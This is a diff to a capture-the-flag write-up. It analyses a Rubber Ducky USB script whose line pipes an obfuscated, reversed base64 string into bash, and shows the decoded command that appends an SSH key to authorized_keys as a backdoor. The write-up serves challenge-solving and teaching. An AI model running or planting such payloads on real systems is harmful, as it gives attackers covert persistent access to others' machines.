@@ -23,7 +23,7 @@ The **Strange USB Device** is located on the 2nd floor in the **Speaker Un-Prepa
 
 At first glance there is a file `inject.bin` in the `/mnt/USBDEVICE/` directory, the contents of which appear to be unreadable.  From the hints and narrative, I know that this is some kind of Rubber Ducky USB device mounted to the terminal.  Conveniently we also find `mallard.py` 
 
-```
+```python
 DELAY 200
 STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
 ENTER
@@ -36,7 +36,7 @@ GUI q
 
 That hash at the start of the file is particularly interesting – it also seems to be followed by some handy instructions for us!  So, by first running `rev` to reverse the hash and then `base64 -d` to decode it, we get the following:
 
-```
+```console
 echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
 ```
 
